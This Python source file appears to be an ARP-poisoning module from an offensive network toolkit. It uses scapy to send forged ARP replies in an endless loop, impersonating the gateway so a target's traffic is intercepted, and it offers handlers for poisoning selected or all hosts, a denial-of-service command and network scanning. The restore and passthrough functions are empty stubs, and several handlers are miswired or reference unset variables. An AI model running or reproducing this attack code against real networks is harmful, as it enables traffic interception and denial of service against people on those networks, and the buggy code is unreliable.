"""
Man-in-the-Middle (MITM) Module
Provides methods to ARP poison devices
"""

import sys
import os
# Ensure proper import paths
modules_dir = os.path.dirname(os.path.abspath(__file__))
if modules_dir not in sys.path:
    sys.path.insert(0, modules_dir)
parent_dir = os.path.dirname(modules_dir)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

# Import with full path for singleton consistency
try:
    from Modules.Network_Modules import network_adapter as iface
    from Modules.Network_Modules import net_tools as network
    from Modules.base_module import BaseModule
    from Modules.message_broker import Message
except ImportError:
    from Network_Modules import network_adapter as iface
    from Network_Modules import net_tools as network
    from base_module import BaseModule
    from message_broker import Message

from scapy.all import *
import scapy.all as scapy
import threading

class MitmModule(BaseModule):
    def __init__(self):
        super().__init__("mitm")
        
        # Module state
        self.is_poisoning = False
        self.target_ip = None
        self.target_mac = "FF:FF:FF:FF:FF:FF"
        self.target_mac_list = None
        self.target_ip_list = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.self_mac = None

        # Register command handlers
        self.register_handler("poison_all", self.handle_poison_all)
        self.register_handler("poison_selected", self.handle_poison_selected)
        self.register_handler("dos", self.handle_get_status)
        self.register_handler("passthrough", self.handle_passthrough)
        self.register_handler("restore", self.handle_restore)
        self.register_handler("get_status", self.handle_get_status)
        self.register_handler("stop", self.handle_stop_poison)
        self.register_handler("scan", self.handle_scan)
    
    def on_start(self):
        """Initialize module"""
        print(f"[{self.module_name}] MITM module initialized")
        
        # Ensure adapter is in managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")

        # Set gateway info
        self.gateway_ip = network.get_router_ip(iface.ADAPTER_NAME)
        self.gateway_mac = network.get_router_mac(iface.ADAPTER_NAME)
    
    def on_stop(self):
        """Cleanup module"""
        if self.is_poisoning:
            self.stop_poisoning()
    
    # Command Handlers
    
    def handle_poison_all(self, message: Message):
        """Handle poisoning all ip's"""
        self.target_ip_list = message.data.get("target_ips")

        if not self.target_ip:
            return {
                "status": "error", 
                "message": "Target IP's required"
            }
        
        if self.is_poisoning:
            return {"status": "error", "message": "Attack already in progress"}
        
        # Ensure managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")
            self.send_event("status_update", {"status": "adapter_mode_changed", "mode": "managed"})
        
        # Start poisoning
        self.is_poisoning = True

        poison_thread = threading.Thread(target=self._poison_worker, daemon=True)
        poison_thread.start()
        
        return {
            "status": "attack_started",
        }

    def handle_poison_selected(self, message: Message):
        """Handle poison selection"""
        self.target_ip = message.data.get("target_ip")

        if not self.target_ip:
            return {
                "status": "error",
                "message": "Target IP required"
            }

        if self.is_poisoning:
            return {"status": "error", "message": "Attack already in progress"}

        # Ensure managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")
            self.send_event("status_update", {"status": "adapter_mode_changed", "mode": "managed"})

        # Start poisoning
        self.is_poisoning = True

        poison_thread = threading.Thread(target=self._poison_worker, daemon=True)
        poison_thread.start()

        return {
            "status": "attack_started",
        }

    def handle_dos(self, message: Message):
        self.target_ip = message.data.get("target_ip")

        if not self.target_ip:
            return {
                "status": "error",
                "message": "Target IP required"
            }

        if self.is_poisoning:
            return {"status": "error", "message": "Attack already in progress"}

        # Ensure managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")
            self.send_event("status_update", {"status": "adapter_mode_changed", "mode": "managed"})

        # Start poisoning
        self.is_poisoning = True
        self.packets_captured = 0

        poison_thread = threading.Thread(target=self._poison_worker, daemon=True)
        poison_thread.start()

        return {
            "status": "attack_started",
        }

    def handle_passthrough(self, message: Message):
        pass

    def handle_restore(self, message: Message):
        pass
    
    def _poison_worker(self):
        """Background worker for ARP poisoning"""
        try:
            self.send_event("attack_status", {
                "status": "poisoning",
                "target": self.target_ip,
            })
            
            # TODO: Implement actual ARP poisoning
            while self.is_poisoning:
                arp_response = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.self_mac)
                scapy.send(arp_response, verbose=False)
                print("Sent ARP response")
            
        except Exception as e:
            self.send_event("attack_error", {"error": str(e)})
            self.is_poisoning = False
    
    def handle_stop_poison(self, message: Message):
        """Stop ARP poisoning"""
        if not self.is_poisoning:
            return {"status": "no_attack_running"}
        
        self.stop_poisoning()
        return {"status": "stopping"}
    
    def stop_poisoning(self):
        """Internal method to stop poisoning"""
        self.is_poisoning = False
        # TODO: Send ARP packets to restore normal operation
    
    def handle_get_status(self, message: Message):
        """Get current module status"""
        return {
            "is_poisoning": self.is_poisoning,
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "packets_captured": self.packets_captured,
            "adapter_mode": iface.ADAPTER_STATUS
        }

    def handle_scan(self, message: Message):
        self.scan_hosts()
        return {
            "is_scanning": True
        }

    def scan_hosts(self):
        """Internal method to scan hosts"""
        hosts = network.scan_network(self.gateway_ip)
        return {
            "hosts": hosts,
        }

# Initialize module (called by bridge)
def init(host_socket):
    """Legacy init function - now handled by bridge"""
    pass

# Global instance
_module = None

def get_module() -> MitmModule:
    global _module
    if _module is None:
        _module = MitmModule()
    return _module
